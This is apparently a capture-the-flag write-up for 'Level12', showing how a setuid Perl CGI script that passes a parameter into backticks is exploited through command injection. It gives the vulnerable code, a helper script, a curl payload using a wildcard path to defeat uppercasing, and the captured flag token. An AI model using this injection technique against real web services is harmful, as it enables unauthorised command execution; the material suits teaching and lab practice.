# Level12

## Solution

We have a Perl script.

```
$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

This script uses the variable ``x``, uppercase it, then truncates all characters after the first whitespace. 

```
$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

This line contains a vulnerability that allows bash code to be injected.

```
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

We will create a bash executable file that launches ``getflag``.

```
$ vim /tmp/TEST
$ cat /tmp/TEST
#!/bin/bash
getflag > /tmp/flag
$ chmod 777 /tmp/TEST
```

We ``curl`` with `` in the argument so that it executes bash code.

```
$ curl http://localhost:4646/?x='`/*/TEST`'
$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```